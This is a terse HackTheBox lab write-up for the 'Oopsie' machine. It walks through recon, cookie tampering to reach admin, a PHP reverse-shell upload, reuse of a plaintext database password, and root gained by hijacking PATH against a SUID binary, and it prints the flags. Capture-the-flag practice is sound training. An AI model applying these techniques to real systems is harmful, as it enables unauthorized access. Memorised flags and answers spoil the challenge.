#HackTheBox 
# 1- Recon
## Nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)
|   256 241da417d4e32a9c905c30588f60778d (ECDSA)
|_  256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome

## Burp SiteMap
http://htb/cdn-cgi/login/script.js $(login page)$

# 2- Exploitation
## Connexion as guest

### Find
| Access ID |  Name |  Email |
|    34322    | admin | admin@megacorp.com

### Modify cookie with admin infos
## 
## Revershell uploaded in upload form
usr/share/webshells/php/php-reverse-shell.php

# 3- Foothold
## Find
[www-data@oopsie:/home/robert$] cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert',' M3g4C0rpUs3r! ','garage');
?>
# 4- Translation
[www-data@oopsie:/var/www/html/cdn-cgi/login$] su robert
Password: M3g4C0rpUs3r!

## Find
[robert@oopsie:~$] id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)

[robert@oopsie:~$] find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker


# 5- PrivEsc
[robert@oopsie:~$] /usr/bin/bugtracker
/usr/bin/bugtracker------------------
: EV Bug Tracker :
Provide Bug ID: 4
cat: /root/reports/4: No such file or directory

## Exploit not absolut path environment
#ExploitNotAbsolutPath 
[robert@oopsie:/tmp$] PATH=/tmp:$PATH
[robert@oopsie:/tmp$] echo "/bin/bash" > cat && chmod +x cat

robert@oopsie:/tmp$ /usr/bin/bugtracker
: EV Bug Tracker :
Provide Bug ID: 4
[root@oopsie:/root#] more root.txt
af13b0bee69f8a877c3faf667f7beacf
